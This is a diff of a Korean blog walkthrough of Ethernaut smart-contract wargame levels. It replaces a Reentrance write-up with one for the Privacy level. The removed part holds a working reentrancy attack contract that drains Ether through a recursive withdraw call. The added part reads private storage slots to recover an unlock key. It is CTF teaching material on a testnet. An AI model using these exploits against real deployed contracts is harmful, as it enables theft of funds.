@@ -19,126 +19,91 @@ __Difficulty 8/10__
 - - -
 
 ## 승리 조건
-- Reentrance contract의 모든 Ether 훔쳐오기
-
+- contract를 unlock 하기!
+- 즉 변수 locked를 false로 만들기
 - - -
 
 ## 코드 분석
 분석은 주석에!
 
 ```solidity
-contract Reentrance {
+contract Privacy {
+    
+    bool public locked = true; // slot 0
+    uint256 public ID = block.timestamp; // slot 1
+    uint8 private flattening = 10; // slot 2
+    uint8 private denomination = 255; // slot 2
+    uint16 private awkwardness = uint16(now); // slot 2
+    bytes32[3] private data; // slot 3,4,5
 
-    using SafeMath for uint256;
-    mapping(address => uint) public balances;
-
-    // _to에게 기부할 수 있는 function 
-    function donate(address _to) public payable {
-        // 기부 받는 사람의 balance를 msg.value만큼 늘린다.
-        balances[_to] = balances[_to].add(msg.value);
-    }
-
-    // _who의 balance를 return 한다.
-    function balanceOf(address _who) public view returns (uint balance) {
-        return balances[_who];
-    }
-
-    // 자신이 가지고 있는 balance에서 인출(withdraw)할 수 있다.
-    function withdraw(uint _amount) public {
-        // msg.sender의 balance가 인출하려는 액수와 같거나 큰지 체크
-        if(balances[msg.sender] >= _amount) {
-            // msg.sender에게 _amount의 액수만큼 Ether를 보낸다.
-            (bool result,) = msg.sender.call{value:_amount}("");
-            if(result) {
-                _amount;
-            }
-            // balance에서 인출한 만 balance를 줄인다.
-            balances[msg.sender] -= _amount;
-        }
+    //constructor: set data
+    constructor(bytes32[3] memory _data) public {
+        data = _data;
     }
     
-    receive() external payable {}
+    // key를 가지고 unlock 할 수 있는 function 
+    function unlock(bytes16 _key) public {
+        // _key와 bytes16(data[2])의 값이 같은지 확인한다.
+        require(_key == bytes16(data[2]));
+        // unlock 한다.
+        locked = false;
+    }
+
+    /*
+        A bunch of super advanced solidity algorithms...
+
+        ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+        .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+        *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+        `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+        ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+    */
 }
+
 ```
 - - -
 
-### 풀이를 위한 Setup
-[RemixIDE](https://remix.ethereum.org)를 사용한다. 
-remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
-그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.
-
-한 가지 주의할 점은 Reentrance는 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
-또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.
 
 ## 풀이
-이 문제에서 우리의 목표는 Reentrance contract에서 모든 Ether를 훔쳐오는 것이다.
+이 문제에서 우리의 목표는 Privacy contract를 locked 변수를 false로 만드는 것이다. 
 
-위 코드는 취약점 시리즈 1에서 공부했었던 [Reentrancy Attack](https://holyhansss.github.io/vulnerability/reentrancy_attack/reentrancy_attack/)와 비슷한 코드를 가지고 있다. 
+[Ethernaut 8 Vault](https://holyhansss.github.io/ethernaut/8_vault_ethernaut/8_vault_ethernaut/)와 비슷하다고 생각한다.
 
-이 문제에 들어가기 전에 우리가 알아야 할 것은 함수를 실행하는 도중에 다시 함수가 불릴 수 있다는 것이다. Ethernaut에세 주는 힌트에서 알 수 있듯이 다른 contract를 통해 이를 가능케 할 수 있다.
+이 문제를 풀기전에 우리가 알아야 하는 것들이 있다.
+- Storage
+- casting
+에 대해서 확실하게 알아야 한다.
+Vault에서도 설명했지만 한번 더 storage에 대해서 설명하겠다. 
+EVM의 Storage는 2^256개의 메모리 슬롯을 가지고 있다. 그리고 각 slot은 32 bytes( = 256 bits)의 크기이다. 하나의 slot에 여러가지 변수를 저정할 수 있다. 하지만 변수 선언 순서에 따라 slot 할당이 달라지니 유의하자! 아래의 예시처럼 uint8, uint256, uint8은 3개를 차지하지만 uint8, uint8, uint256은 슬롯 2개 밖에 차지하지 않는다.  Gas optimization을 위해서는 우리가 꼭 알고 있어야할 내용이다!
+    ```solidity
+    uint8 a // slot 0
+    uint256 b // slot 1
+    uint8 c // slot 2
+    ```
+    ```solidity
+    uint8 a // slot 0
+    uint8 b // slot 0
+    uint256 c // slot 1
+    ```
+[이 글](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)에 설명이 잘 되어있으니 한번 확인해 보자! 이 글에서는 casting에 대해서도 다루고 있으니 꼭 보고 오는 것을 추천한다.
 
-AttackReentrance contract를 한번 보며 더 이해해보자!
+우리는 이 문제를 풀기 위해 web3.eth.getStorageAt() method를 사용한다. web3.eth.getStorageAt를 통해 우리는 lowlevel에서 storage data를 불러올 수 있다.
 
-우선 console 창에서 여러가지 정보를 확인해 보자
+우선 console 창에서 실행시킨다
 ctrl + shift + i를 눌러 console창을 활성화 시키자
 ```javascript
-// contract가 가지고 있는 ether의 양 확인
-await getBalance(instance) 
+// locked가 true로 lock된 것을 알 수 있다.
+await contract.locked()
+
+// 코드 분석에서 봤듯이 data[2]는 5 번째 slot에 저장되어있다.
+await web3.eth.getStorageAt(instance, 5) // 0x3aa30e05517b3f1490c335bb41be74713b0568225baaad3b56642e103a3b4335
+
+// 우리는 16bytes 만 필요하기 때문에 반을 뚝 잘라 앞부분만 사용한다.
+await contract.unlock("0x3aa30e05517b3f1490c335bb41be7471")
+
+// locked가 false로 바뀐 것을 확인 할 수 있다.
+await contract.locked()
 ```
-
-
-```solidity
-contract AttackReentrance {
-
-    Reentrance reentrance;
-    // value라는 변수를 통해 donate하는 액수와 withdraw하는 액수를 같게 만들었다.
-    uint256 value;
-    
-    // constructor
-    constructor(address payable _reentrance) public {
-        // attack 할 contract 불러오기
-        reentrance = Reentrance(_reentrance);
-        // value를 0.001 ether로 설정: Reentrance contract의 balance가 0.001 ehter 였기 때문에 이렇게 설정했다.
-        value = 0.001 ether;
-    }
-
-    // Reentrance contract의 donate 함수를 실행시키는 함수
-    function attackDonate() public payable {
-        // msg.value가 value 값과 같은지 확인
-        require(value == msg.value);
-        // Reentrance contract의 donate 함수 실행
-        reentrance.donate{value: msg.value}(address(this));
-    }
-
-    // Reentrance의 withdraw 함수를 실행
-    function attackWithdraw() public payable {
-        // 자신에게 value 만큼 donate했기 때문에 value만큼 인출한다.
-        reentrance.withdraw(value);
-    }
-
-    // receive function
-    receive() external payable {
-        // 돈을 인출하자마자 다시 withdraw를 call한다.
-        // 실질적인 공격 코드!
-        reentrance.withdraw(value);
-    }
-}
-```
-위 코드를 Remix IDE에서 위 코드를 Rinkeby Network에 배포한다. 그럼 아래와 같은 버튼들이 나올 것이다. 
-
-![remix_attack_reentrance](remix_attack_reentrance.png)
-위 버튼들 중에서 attackDonate 버튼을 눌러 donate하고 attackWithdraw를 통해 withdraw 하면 공격이 끝난다. 
-
-이후 
-```javascript
-// contract가 가지고 있는 ether의 양 0이 된 것을 확인 할 수 있다.
-await getBalance(instance) 
-
-// attackContract 가 가지고 있는 ether의 양이 늘어날 것을 확인할 수 있다
-await getBalance("address of attackContract")
-```
-
-
 이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
 ```
 ٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
@@ -147,15 +112,17 @@ await getBalance("address of attackContract")
 - - -
 
 ## 마무리
-Reentrancy attack은 굉장히 유명한 공격 중 하나이다. 내가 지금까지 다뤘던 것은 Reentrancy on a Single Function 이었다. The DAO 사태는 Cross-function Reentrancy였던만큼 Cross-function도 꼭 한번 다뤄야겠다고 느낀다. 나머지 시리즈도 화이팅!
+블록체인상의 정보는 모두에게 공개된다. 모든 사람이 storage를 쉽게 확인 할 수 있기 때문이다. 민감한 정보들은 블록체인에 올리지 않는 것이 좋다. 또한 변수 선언 순서에 따라 때로는 더 많은 비용를 지불해야 할 수도 있기 때문에 코드를 적을때 항상 최적화에 대해 생각하며 하자!! 
+
 
 - - -
 ## 기타 정보
 - rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
 - ethernaut: https://ethernaut.openzeppelin.com/
 - remix IDE: https://remix.ethereum.org
-- Re-entrancy 취약점: https://holyhansss.github.io/vulnerability/reentrancy_attack/reentrancy_attack/
-
+- Ethernaut 8 Vault: https://holyhansss.github.io/ethernaut/8_vault_ethernaut/8_vault_ethernaut/
+- Storage & Casting: https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183
+- Privacy 취약점: https://holyhansss.github.io/vulnerability/private_variable/private_variable/
 ```toc
 
 ```
